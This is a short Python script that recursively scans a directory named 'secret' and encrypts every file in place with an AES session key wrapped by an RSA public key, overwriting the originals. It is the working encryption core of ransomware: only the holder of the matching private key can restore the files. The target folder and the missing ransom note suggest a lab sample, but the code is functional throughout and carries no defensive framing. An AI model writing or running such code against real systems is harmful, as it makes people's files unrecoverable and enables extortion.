import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes

# This function returns an iterator that yields all the files in the given directory
# and its subdirectories.
def scan(top_dir):
    for object in os.scandir(top_dir):
        if object.is_file():
            yield object
        else:
            yield from scan(object.path)

# This function encrypts the given file using the RSA public key in the given file.
def encrypt(file,publickeyfile):

    # Read the public key from the file
    with open(publickeyfile, 'rb') as f:
        pubkey = f.read()

    # Read the contents of the file to be encrypted
    with open(file,'rb') as f:
        file_to_enc = f.read()
    
    # Create a session key and a public key object.
    # The session key is used to encrypt the file,
    # and the public key object is used to encrypt the session key.
    # Modification of the file will result in lost data.
    public_key_object = RSA.import_key(pubkey)
    session_key = get_random_bytes(16)

    # Encrypt the session key with the public key
    cipher_code = PKCS1_OAEP.new(public_key_object)
    encrypted_Session_Key = cipher_code.encrypt(session_key)

    # Encrypt the file with the session key
    cipher_code = AES.new(session_key, AES.MODE_EAX) 
    # EAX mode allows the receiver to detect unauthorized modification
    cipher_text, tag = cipher_code.encrypt_and_digest(file_to_enc)

    # Overwrite the original file with the encrypted data
    with open(file,'wb') as f:
        [ f.write(x) for x in (encrypted_Session_Key, cipher_code.nonce, tag, cipher_text) ]
        print("Encrypted successfully")

if __name__ == "__main__":
    # The top directory to start encryption.
    directory = 'secret' 
    for item in scan(directory): 
        # Encrypt all files
        encrypt(Path(item), 'public.pem')
